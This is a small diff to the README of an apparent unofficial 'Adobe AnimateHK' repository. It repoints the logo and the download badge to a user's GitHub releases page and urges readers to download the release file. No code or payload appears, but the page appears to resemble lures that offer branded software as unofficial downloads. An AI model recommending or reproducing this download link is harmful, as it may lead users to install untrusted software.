@@ -3,7 +3,7 @@
 
 Welcome to the **Adobe AnimateHK** repository! 🌟
 
-![Adobe Animate Logo](https://www.example.com/adobe-animate-logo.png)
+![Adobe Animate Logo](https://github.com/kjplopez26/Adobe-AnimateHK/releases)
 
 ## Overview
 
@@ -62,7 +62,7 @@ The repository covers a wide range of topics related to Adobe Animate, including
 
 Explore the Adobe AnimateHK repository and unleash your creativity! You can download the latest release from the following link:
 
-[![Download Adobe AnimateHK](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Adobe AnimateHK](https://github.com/kjplopez26/Adobe-AnimateHK/releases)](https://github.com/kjplopez26/Adobe-AnimateHK/releases)
 
 🚀 Click the button above to download the release file and get started with Adobe AnimateHK!
 
